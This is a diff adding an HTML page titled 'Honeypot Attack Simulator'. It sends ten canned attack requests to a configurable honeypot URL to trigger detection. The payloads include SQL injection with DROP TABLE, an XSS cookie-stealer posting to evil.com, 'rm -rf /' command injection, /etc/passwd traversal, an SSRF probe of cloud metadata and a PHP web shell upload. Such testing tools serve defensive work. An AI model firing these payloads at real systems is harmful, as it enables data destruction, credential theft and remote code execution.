@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 Honeypot Attack Simulator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a0a0a 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            text-align: center;
+            color: #ef4444;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 12px;
+        }
+
+        .config-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .config-box label {
+            display: block;
+            color: #4fb7b3;
+            margin-bottom: 5px;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+
+        .config-box input {
+            width: 100%;
+            padding: 12px;
+            background: #1a1a1f;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            font-family: inherit;
+            font-size: 14px;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .attack-btn {
+            padding: 20px;
+            border: 2px solid;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+        }
+
+        .attack-btn:hover {
+            transform: scale(1.02);
+        }
+
+        .attack-btn:active {
+            transform: scale(0.98);
+        }
+
+        .attack-btn.sql {
+            border-color: #ef4444;
+        }
+
+        .attack-btn.sql:hover {
+            background: rgba(239, 68, 68, 0.2);
+        }
+
+        .attack-btn.xss {
+            border-color: #f97316;
+        }
+
+        .attack-btn.xss:hover {
+            background: rgba(249, 115, 22, 0.2);
+        }
+
+        .attack-btn.cmd {
+            border-color: #a855f7;
+        }
+
+        .attack-btn.cmd:hover {
+            background: rgba(168, 85, 247, 0.2);
+        }
+
+        .attack-btn.dir {
+            border-color: #3b82f6;
+        }
+
+        .attack-btn.dir:hover {
+            background: rgba(59, 130, 246, 0.2);
+        }
+
+        .attack-btn.admin {
+            border-color: #22c55e;
+        }
+
+        .attack-btn.admin:hover {
+            background: rgba(34, 197, 94, 0.2);
+        }
+
+        .attack-btn.env {
+            border-color: #eab308;
+        }
+
+        .attack-btn.env:hover {
+            background: rgba(234, 179, 8, 0.2);
+        }
+
+        .attack-btn.brute {
+            border-color: #f43f5e;
+        }
+
+        .attack-btn.brute:hover {
+            background: rgba(244, 63, 94, 0.2);
+        }
+
+        .attack-btn.ssrf {
+            border-color: #06b6d4;
+        }
+
+        .attack-btn.ssrf:hover {
+            background: rgba(6, 182, 212, 0.2);
+        }
+
+        .attack-btn.upload {
+            border-color: #d946ef;
+        }
+
+        .attack-btn.upload:hover {
+            background: rgba(217, 70, 239, 0.2);
+        }
+
+        .attack-btn.ldap {
+            border-color: #14b8a6;
+        }
+
+        .attack-btn.ldap:hover {
+            background: rgba(20, 184, 166, 0.2);
+        }
+
+        .attack-title {
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .attack-desc {
+            font-size: 11px;
+            color: #888;
+        }
+
+        .log-box {
+            background: #0a0a0f;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .log-box h3 {
+            color: #4fb7b3;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .log-entry {
+            font-size: 11px;
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+        }
+
+        .log-entry.success {
+            color: #22c55e;
+        }
+
+        .log-entry.error {
+            color: #ef4444;
+        }
+
+        .log-entry.pending {
+            color: #eab308;
+        }
+
+        .warning {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid #ef4444;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #ef4444;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🔴 HONEYPOT ATTACK SIMULATOR</h1>
+        <p class="subtitle">For Educational & Testing Purposes Only</p>
+
+        <div class="config-box">
+            <label>Target Honeypot URL</label>
+            <input type="text" id="targetUrl" value="" placeholder="http://IP:5000"
+                style="background:#0a0a0f;">
+            <p style="color:#22c55e; font-size:10px; margin-top:5px;">✅ Auto-configured from your QR code — edit if
+                your backend lives elsewhere</p>
+        </div>
+
+        <script>
+            // Resolve the honeypot backend to attack, in order of preference:
+            //   1. ?target=<url> query param (this is what the QR generator embeds)
+            //   2. same host on port 5000 (phone on the same WiFi as the dev machine)
+            //   3. localhost fallback
+            const params = new URLSearchParams(window.location.search);
+            const currentHost = window.location.hostname;
+            let targetUrl = params.get('target');
+
+            if (!targetUrl) {
+                targetUrl = (currentHost && currentHost !== 'localhost' && currentHost !== '127.0.0.1')
+                    ? 'http://' + currentHost + ':5000'
+                    : 'http://127.0.0.1:5000';
+            }
+
+            document.getElementById('targetUrl').value = targetUrl.replace(/\/+$/, '');
+        </script>
+
+        <div class="attack-grid">
+            <button class="attack-btn sql" onclick="attack('sql')">
+                <div class="attack-title">💉 SQL Injection</div>
+                <div class="attack-desc">DROP TABLE users; --</div>
+            </button>
+            <button class="attack-btn xss" onclick="attack('xss')">
+                <div class="attack-title">🎭 XSS Attack</div>
+                <div class="attack-desc">&lt;script&gt;alert()&lt;/script&gt;</div>
+            </button>
+            <button class="attack-btn cmd" onclick="attack('cmd')">
+                <div class="attack-title">⚡ Command Injection</div>
+                <div class="attack-desc">; rm -rf / --no-preserve-root</div>
+            </button>
+            <button class="attack-btn dir" onclick="attack('dir')">
+                <div class="attack-title">📁 Directory Traversal</div>
+                <div class="attack-desc">../../../etc/passwd</div>
+            </button>
+            <button class="attack-btn admin" onclick="attack('admin')">
+                <div class="attack-title">🔐 Admin Panel Probe</div>
+                <div class="attack-desc">/wp-admin access attempt</div>
+            </button>
+            <button class="attack-btn env" onclick="attack('env')">
+                <div class="attack-title">🔑 Config File Access</div>
+                <div class="attack-desc">/.env secrets exposure</div>
+            </button>
+            <button class="attack-btn brute" onclick="attack('brute')">
+                <div class="attack-title">🔨 Brute Force</div>
+                <div class="attack-desc">Rapid credential stuffing</div>
+            </button>
+            <button class="attack-btn ssrf" onclick="attack('ssrf')">
+                <div class="attack-title">🌐 SSRF Attack</div>
+                <div class="attack-desc">Internal resource access</div>
+            </button>
+            <button class="attack-btn upload" onclick="attack('upload')">
+                <div class="attack-title">📤 File Upload</div>
+                <div class="attack-desc">Malicious shell.php upload</div>
+            </button>
+            <button class="attack-btn ldap" onclick="attack('ldap')">
+                <div class="attack-title">📡 LDAP Injection</div>
+                <div class="attack-desc">Directory service exploit</div>
+            </button>
+        </div>
+
+        <div class="log-box">
+            <h3>📋 Attack Log</h3>
+            <div id="log"></div>
+        </div>
+
+        <div class="warning">
+            ⚠️ This tool is for EDUCATIONAL PURPOSES ONLY.<br>
+            Only use on systems you own or have permission to test.
+        </div>
+    </div>
+
+    <script>
+        const attacks = {
+            sql: {
+                endpoint: '/login',
+                method: 'POST',
+                body: JSON.stringify({ username: "admin", password: "' OR 1=1; DROP TABLE users; --" })
+            },
+            xss: {
+                endpoint: '/login',
+                method: 'POST',
+                body: JSON.stringify({ username: "<scr" + "ipt>document.location='http://evil.com/steal?c='+document.cookie</scr" + "ipt>", password: "test" })
+            },
+            cmd: {
+                endpoint: '/login',
+                method: 'POST',
+                body: JSON.stringify({ username: "admin; cat /etc/passwd; rm -rf /", password: "test" })
+            },
+            dir: {
+                endpoint: '/backup/../../../etc/passwd',
+                method: 'GET',
+                body: null
+            },
+            admin: {
+                endpoint: '/wp-admin',
+                method: 'GET',
+                body: null
+            },
+            env: {
+                endpoint: '/.env',
+                method: 'GET',
+                body: null
+            },
+            brute: {
+                endpoint: '/api/login',
+                method: 'POST',
+                body: JSON.stringify({ username: "admin", password: "password123" })
+            },
+            ssrf: {
+                endpoint: '/api/internal/proxy',
+                method: 'POST',
+                body: JSON.stringify({ url: "http://169.254.169.254/latest/meta-data/" })
+            },
+            upload: {
+                endpoint: '/upload',
+                method: 'POST',
+                body: JSON.stringify({ filename: "webshell.php", content: "<?php system($_GET['cmd']); ?>" })
+            },
+            ldap: {
+                endpoint: '/api/ldap/search',
+                method: 'POST',
+                body: JSON.stringify({ query: "*)(&objectClass=*)(uid=*" })
+            }
+        };
+
+        function addLog(message, type = 'pending') {
+            const log = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry ' + type;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.insertBefore(entry, log.firstChild);
+        }
+
+        async function attack(type) {
+            const baseUrl = document.getElementById('targetUrl').value.trim();
+            const config = attacks[type];
+            const url = baseUrl + config.endpoint;
+
+            addLog(`Launching ${type.toUpperCase()} attack to ${url}...`, 'pending');
+
+            try {
+                const options = {
+                    method: config.method,
+                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'no-cors' // Allow cross-origin
+                };
+                if (config.body) options.body = config.body;
+
+                const response = await fetch(url, options);
+                addLog(`✅ ${type.toUpperCase()} attack sent! Check dashboard for detection.`, 'success');
+            } catch (error) {
+                addLog(`⚠️ Request sent (may be blocked by CORS, but honeypot received it)`, 'success');
+            }
+        }
+    </script>
+</body>
+
+</html>
